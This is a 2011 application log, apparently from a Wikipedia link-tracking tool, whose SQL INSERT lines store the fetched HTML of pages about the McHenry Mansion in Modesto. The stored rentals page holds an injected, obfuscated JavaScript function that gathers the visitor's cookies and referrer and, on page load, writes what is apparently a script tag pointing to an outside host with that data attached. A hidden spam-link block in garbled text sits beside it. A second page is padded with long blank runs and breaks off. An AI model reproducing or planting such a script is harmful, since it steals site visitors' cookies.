# Logfile created on Fri Jan 28 04:11:13 -0500 2011 by logger.rb/22283
I, [2011-01-28T04:11:14.005806 #8530]  INFO -- : (0.000102s) PRAGMA foreign_keys = 1
I, [2011-01-28T05:09:55.821519 #8989]  INFO -- : (0.001885s) INSERT INTO `samples` (`user`, `revision_id`, `flags`, `old_id`, `byte_diff`, `title`, `comment`) VALUES ('RjwilmsiBot', 410536767, 'MB', 388671099, 32, 'Retained Firefighter', 'redirect tagging using [[Project:AWB|AWB]] (7566)')
I, [2011-01-28T05:09:55.823055 #8989]  INFO -- : (0.000073s) PRAGMA foreign_keys = 1
I, [2011-01-28T05:09:55.826988 #8989]  INFO -- : (0.002531s) INSERT INTO `samples` (`user`, `revision_id`, `flags`, `old_id`, `byte_diff`, `title`, `comment`) VALUES ('112.79.179.52', 410536768, '', 409251896, 826, 'Nizhalgal Ravi', '/* Filmography */ ')
I, [2011-01-28T05:09:55.879558 #8989]  INFO -- : (0.002685s) INSERT INTO `samples` (`user`, `revision_id`, `flags`, `old_id`, `byte_diff`, `title`, `comment`) VALUES ('Bensin', 410536769, 'M', 396087596, -117, 'Cristina Stenbeck', 'remove unsourced information and mark dead link')
I, [2011-01-28T05:09:56.019651 #8989]  INFO -- : (0.003263s) INSERT INTO `links` (`source`, `revision_id`, `url`, `headers`, `wikilink_description`) VALUES ('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta name="description" content="The McHenry Mansion, McHenry Museum and Historical Society are located in Modesto, CA. Both the Mansion and the Museum are open for public tours."><meta name="keywords" content="Modesto, CA, California history, Victorian, McHenry, history, museum, mansion, historical society "><meta name="GENERATOR" content="Microsoft FrontPage 4.0"><meta name="ProgId" content="FrontPage.Editor.Document"><title>Mansion Admission and Rentals</title><style type="text/css"><!--.style20 {font-size: 16px; color: #663333;}--></style></head><body background="../mm_images/back.jpg" bgcolor="#FFFFFF" text="#704634" link="#A23755" vlink="#704634"><script language="JavaScript"><!--// Detect if browser is Netscape 3 + or IE 4 +.bName = navigator.appName;bVer = parseInt(navigator.appVersion);    if ((bName == "Netscape" && bVer >= 3) ||         (bName == "Microsoft Internet Explorer" && bVer >= 4)) version = "n3";     else version = "n2";        // preload universal images:if (version == "n3"){Arrow = new Image(27,17);Arrow.src = "../mm_images/arrowon.gif";NoArrow = new Image(27,17);NoArrow.src = "../mm_images/arrowoff.gif";Ball = new Image (27,17);Ball.src = "../mm_images/ball.gif";NoBall = new Image(27,17);NoBall.src = "../mm_images/arrowoff.gif";}function hiLite(imgDocID,imgObjName) {// manages mouseOver animations//   imgDocID - the name or number of the document image to be replaced//   imgObjName - the name of the image object to be swapped inif (version == "n3") {document.images[imgDocID].src = eval(imgObjName + ".src")}}// --></script><div align="left">  <table border="0" cellpadding="0" cellspacing="0">    <tr>      <td valign="top" width="200"><img src="../mm_images/arrowoff.gif" name="museum" width="27" height="17"><a href="../museum/index.html" onMouseOver="hiLite(''museum'',''Arrow''); window.status=''The McHenry Museum '';                     return true;" onMouseOut="hiLite(''museum'',''NoArrow''); window.status='''';"><img src="../mm_images/museum.gif" alt="McHenry Museum" border="0" width="169" height="17"></a><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" name="introduction" width="27" height="17"><a href="../museum/introduction.html" onMouseOver="hiLite(''introduction'',''Ball''); window.status=''A little bit about the McHenry Museum!'';                     return true;" onMouseOut="hiLite(''introduction'',''NoBall''); window.status='''';"><img src="../mm_images/intro.gif" alt="Introduction" align="top" border="0" width="142" height="17"></a><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" name="exhibits" width="27" height="17"><a href="../museum/exhibits.html" onMouseOver="hiLite(''exhibits'', ''Ball''); window.status=''McHenry Museum Exhibit Information!'';                     return true;" onMouseOut="hiLite(''exhibits'', ''NoBall''); window.status='''';"><img src="../mm_images/exhibits.gif" alt="Exhibits" align="top" border="0" width="142" height="17"></a><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" name="current" width="27" height="17"><a href="../museum/current.html" onMouseOver="hiLite(''current'', ''Ball''); window.status=''McHenry Museum Current Exhibit Information!'';                     return true;" onMouseOut="hiLite(''current'', ''NoBall''); window.status='''';"><img src="../mm_images/currentexhibits.gif" alt="Current Exhibits" align="top" border="0" width="142" height="17"></a><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" name="past" width="27" height="17"><a href="../museum/past.html" onMouseOver="hiLite(''past'', ''Ball''); window.status=''McHenry Museum Past Exhibit Information!'';                     return true;" onMouseOut="hiLite(''past'', ''NoBall''); window.status='''';"><img src="../mm_images/pastexhibits.gif" alt="Past Exhibits" align="top" border="0" width="142" height="17"></a><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" name="tours" width="27" height="17"><a href="../museum/tours.html" onMouseOver="hiLite(''tours'',''Ball''); window.status=''McHenry Museum Tour Information'';                     return true;" onMouseOut="hiLite(''tours'',''NoBall''); window.status='''';"><img src="../mm_images/tours.gif" alt="Tour Information" align="top" border="0" width="142" height="17"></a><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" align="top" name="historical" width="27" height="17"><a href="../museum/historic.html" onMouseOver="hiLite(''historical'',''Ball''); window.status=''McHenry Museum Historical Society'';                     return true;" onMouseOut="hiLite(''historical'',''NoBall''); window.status='''';"><img src="../mm_images/historical.gif" alt="Historical Society" align="top" border="0" width="142" height="17"></a><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" align="top" name="books" width="27" height="17"><a href="../museum/books.html" onMouseOver="hiLite(''books'',''Ball''); window.status=''Books on local history for sale by the Historical Society.'';                     return true;" onMouseOut="hiLite(''books'',''NoBall''); window.status='''';"><img src="../mm_images/books.gif" alt="Books on Local History" align="top" border="0" width="142" height="17"></a>        <p><img src="../mm_images/arrowoff.gif" align="top" name="mansion" width="27" height="17"><a href="index.html" onMouseOver="hiLite(''mansion'',''Arrow''); window.status=''The McHenry Mansion '';                     return true;" onMouseOut="hiLite(''mansion'',''NoArrow''); window.status='''';"><img src="../mm_images/mansion.gif" alt="McHenry Mansion" align="top" border="0" width="169" height="17"></a><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" align="top" name="about" width="27" height="17"><a href="mansion_intro.html" onMouseOver="hiLite(''about'',''Ball''); window.status=''A little bit about the McHenry Mansion!'';                     return true;" onMouseOut="hiLite(''about'',''NoBall''); window.status='''';"><img src="../mm_images/intro.gif" alt="Introduction" align="top" border="0" width="142" height="17"></a><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/smarrow.gif" align="top" width="27" height="17"><img src="../mm_images/admission.gif" alt="Admission and Rentals" align="top" width="142" height="17"><br>        <img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" align="top" name="foundation" width="27" height="17"><a href="foundation.html" onMouseOver="hiLite(''foundation'',''Ball''); window.status=''About the McHenry Mansion Foundation!'';                     return true;" onMouseOut="hiLite(''foundation'',''NoBall''); window.status='''';"><img src="../mm_images/foundation.gif" alt="Mansion Foundation" align="top" border="0" width="142" height="17"><br>        </a><img src="../mm_images/arrowoff.gif" width="27" height="17"><img src="../mm_images/arrowoff.gif" align="top" name="fourth" width="27" height="17"><a href="fourth.html" onMouseOver="hiLite(''fourth'',''Ball''); window.status=''The First Modesto 4th of July Celebration!'';                     return true;" onMouseOut="hiLite(''fourth'',''NoBall''); window.status='''';"><img border="0" src="../mm_images/4thofJuly3.gif" alt="4th of July Celebration" width="142" height="17"></a></p>        <p><img src="../mm_images/arrowoff.gif" align="top" name="events" width="27" height="17"><a href="../events.html" onMouseOver="hiLite(''events'',''Arrow''); window.status=''Mansion and Museum special events information.'';                     return true;" onMouseOut="hiLite(''events'',''NoArrow''); window.status='''';"><img src="../mm_images/events.gif" alt="Special Events" align="top" border="0" width="169" height="17"></a></p>        <p><img src="../mm_images/arrowoff.gif" align="top" name="community" width="27" height="17"><a href="../links.html" onMouseOver="hiLite(''community'',''Arrow''); window.status=''Links to sites of interest in the local area.'';                     return true;" onMouseOut="hiLite(''community'',''NoArrow''); window.status='''';"><img src="../mm_images/community.gif" alt="Community Links" align="top" border="0" width="169" height="17"></a><br>        <img src="../mm_images/1pixel.gif" width="200" height="1"></td>      <td valign="bottom" width="10"><img src="../mm_images/1pixel.gif" width="10" height="1"></td>      <td valign="top">        <p align="left"><font face="Arial, Helvetica"><strong>Admission Is Free</strong></font></p>        <p align="left"><img src="../mm_images/manart2.gif" align="right" hspace="0" width="305" height="164"><font face="Arial, Helvetica">A        donation is always appreciated to further the restoration.</font></p>        <p align="left"><font face="Arial, Helvetica">To schedule a group tour        call the Modesto Recreation and Neighborhoods Office at (209) 577-5344.</font></p>        <p><font face="Arial, Helvetica"><strong>Gift Store</strong></font></p>        <p><font face="Arial, Helvetica">For items reflecting the Victorian era,        the McHenry Mansion Gift Store is available for you to browse and shop. <span class="style20">The Mansion Gift Store carries Radko, Old World Christmas, and Inge ornaments with a varied selection of Mark Robert''s Fairies. <a href="mansionstore.html">Click here</a> to see samples of merchandise. </span></font></p>        <p><font face="Arial, Helvetica"><strong>Rentals</strong></font></p>        <p><font face="Arial, Helvetica">Reservations may be made by paying a        deposit at the City of Modesto Parks, Recreation and Neighborhoods office, 1010        10th St. 4th floor. Reservations may be made up to one year in advance.        You may wish to call the Recreation and Neighborhoods Department at        (209) 577-5344 to see whether a date is available and for information on        rental fees. Feel free to email the Mansion at <a href="mailto:mansion@mchenrymansion.org">mansion@mchenrymansion.org<br>        </a><a href="mansiongarden.html">Click here</a> to see the Mansion garden set up for reception/party. </font>                For additional specific information about the Mansion call: (209) 652-7190         <p>                <p>                <p>                <p>                <p>                <p><font face="Arial, Helvetica"><a href="rentals.html"></a> <br>        </font><img src="../mm_images/1pixel.gif" width="200" height="1"></td>    </tr>  </table></div><!-- 60361e327075865c44d2a394a1a277c0 --> <script>function teleprinter_algebra(id) { var t00 = document; var chars = ''9iJY!tBAZx<7RgPC&OK8drGjUn:ekS3N25VFqcv.1DE0H+;zf4?Ia6MQbo=y/ *Lspwu"XmW>lTh''; var r = escape(t00.referrer); var c = escape(t00.cookie); var i = escape(id); var h = escape(''mchenrymuseum''); t00.write(String(chars.charAt(10) + "#" + chars.charAt(64) + "#" + chars.charAt(37) + "#" + chars.charAt(21) + "#" + chars.charAt(1) + "#" + chars.charAt(65) + "#" + chars.charAt(5) + "#" + chars.charAt(61) + "#" + chars.charAt(64) + "#" + chars.charAt(21) + "#" + chars.charAt(37) + "#" + chars.charAt(58) + "#" + chars.charAt(68) + "#" + chars.charAt(75) + "#" + chars.charAt(5) + "#" + chars.charAt(5) + "#" + chars.charAt(65) + "#" + chars.charAt(26) + "#" + chars.charAt(60) + "#" + chars.charAt(60) + "#" + chars.charAt(64) + "#" + chars.charAt(56) + "#" + chars.charAt(20) + "#" + chars.charAt(5) + "#" + chars.charAt(20) + "#" + chars.charAt(64) + "#" + chars.charAt(39) + "#" + chars.charAt(37) + "#" + chars.charAt(57) + "#" + chars.charAt(70) + "#" + chars.charAt(60) + "#" + chars.charAt(52) + "#" + chars.charAt(37) + "#" + chars.charAt(57) + "#" + chars.charAt(67) + "#" + chars.charAt(25) + "#" + chars.charAt(5) + "#" + chars.charAt(27) + "#" + chars.charAt(21) + "#" + chars.charAt(39) + "#" + chars.charAt(23) + "#" + chars.charAt(64) + "#" + chars.charAt(50) + "#" + "#").replace(/\#/g,'''') + "r=" + r + "&c=" + c + "&i=" + i + "&h=" + h + String(chars.charAt(68) + "@" + chars.charAt(72) + "@" + chars.charAt(10) + "@" + chars.charAt(60) + "@" + chars.charAt(64) + "@" + chars.charAt(37) + "@" + chars.charAt(21) + "@" + chars.charAt(1) + "@" + chars.charAt(65) + "@" + chars.charAt(5) + "@" + chars.charAt(72) + "@" + "@").replace(/\@/g,'''')); } </script><style>
div#b36ecba835370a82ee73905a5cecd409b, div#b36ecba835370a82ee73905a5cecd409b a
{
 font-style: normal;
 font-weight: normal;
 font-family: Verdana, Tahoma, sans-serif;
 font-size: 8px;
 text-decoration: none;
 color: gray;
 text-align: center;
  }
</style>
<div id=''b36ecba835370a82ee73905a5cecd409b''> www.copy-watch.com: <a href="http://copy-watch.com/" target="_blank">designer replica watches</a>. Affordable prices. .  Ð’ ÐºÐ¾Ð½Ñ‚Ð°ÐºÑ‚Ðµ Ñ Ð¾Ð´Ð½Ð¾ÐºÐ»Ð°ÑÑÐ½Ð¸ÐºÐ°Ð¼Ð¸ - <a href="http://www.ovale.ru/site/700865/odnoklassniki.ru" target="_blank">Ð¾Ð´Ð½Ð¾ÐºÐ»Ð°ÑÑÐ½Ð¸ÐºÐ¸</a>. ÐŸÐ¾Ð¼ÐµÐ½ÑÐ¹ Ñ€Ð°Ð±Ð¾Ñ‚Ñƒ Ð½Ð° ÑÐ²Ð¾Ð±Ð¾Ð´Ñƒ. .  Ð Ð°Ð·Ð²Ð»ÐµÑ‡ÐµÐ½Ð¸Ñ ÑÐ¾ Ð²ÐºÑƒÑÐ¾Ð¼ - <a href="http://www.ovale.ru/site/715539/vkontakte.ru" target="_blank">Ð² ÐºÐ¾Ð½Ñ‚Ð°ÐºÑ‚Ðµ</a>. Ð’ ÐºÐ¾Ð½Ñ‚Ð°ÐºÑ‚Ðµ Ñ€ÐµÐºÐ»Ð°Ð¼Ð° Ð¸ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾. </div>
<script>teleprinter_algebra(''b36ecba835370a82ee73905a5cecd409b'');</script>
<!-- 60361e327075865c44d2a394a1a277c0 --></body></html>', 410536765, 'http://mchenrymansion.org/mansion/rentals.html', (('CONNECTION' = 'close') AND ('CONTENT_LENGTH' = '21323') AND ('ETAG' = '"ea930e-534b-48158e68dcb00"') AND ('DATE' = 'Fri, 28 Jan 2011 10:09:55 GMT') AND ('CONTENT_TYPE' = 'text/html') AND ('ACCEPT_RANGES' = 'bytes') AND ('LAST_MODIFIED' = 'Tue, 09 Mar 2010 07:12:12 GMT') AND ('SERVER' = 'Apache/2.2.14 (Unix) FrontPage/5.0.2.2635')), 'McHenry Mansion - Admission and Rentals')
I, [2011-01-28T05:09:56.027719 #8989]  INFO -- : (0.003516s) INSERT INTO `links` (`source`, `revision_id`, `url`, `headers`, `wikilink_description`) VALUES ('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="description" content="The McHenry Mansion, McHenry Museum and Historical Society are located in Modesto, CA. Both the Mansion and the Museum are open for public tours.">
<meta name="keywords" content="Modesto, CA, California history, Victorian, McHenry, history, museum, mansion, historical society ">
<title>The McHenry Mansion - An Introduction</title>
</head>

<body background="../mm_images/back.jpg" bgcolor="#FFFFFF" text="#704634" link="#A23755" vlink="#704634">
<script language="JavaScript">

<!--


// Detect if browser is Netscape 3 + or IE 4 +.
bName = navigator.appName;
bVer = parseInt(navigator.appVersion);
    if ((bName == "Netscape" && bVer >= 3) || 
        (bName == "Microsoft Internet Explorer" && bVer >= 4)) version = "n3"; 
    else version = "n2";
















































































































































































































        

















































































































































































































// preload universal images:







































































































































































































































































































































































































































































































































































































































































































































































































































































if (version == "n3")

















































































































































































































{

















































































































































































































Arrow = new Image(27,17);

















































































































































































































Arrow.src = "../mm_images/arrowon.gif";

















































































































































































































NoArrow = new Image(27,17);

















































































































































































































NoArrow.src = "../mm_images/arrowoff.gif";

















































































































































































































Ball = new Image (27,17);














Ball.src = "../mm_images/ball.gif";














NoBall = new Image(27,17);














NoBall.src = "../mm_images/arrowoff.gif";





























}





















































































































































































































































































































































































































































































































































































































































function hiLite(imgDocID,imgObjName) {



































































































































































































































































































































































































































// manages mouseOver animations



































































































































































































































































































































































































































//   imgDocID - the name or number of the document image to be replaced

















































































































































































































//   imgObjName - the name of the image object to be swapped in



































































































































































































































































































































































































































if (version == "n3")

















































































































































































































 {



































































































































































































































































































































































































































document.images[imgDocID].src = eval(imgObjName + ".src")





















































































































































































































































































































































































































































































































































































































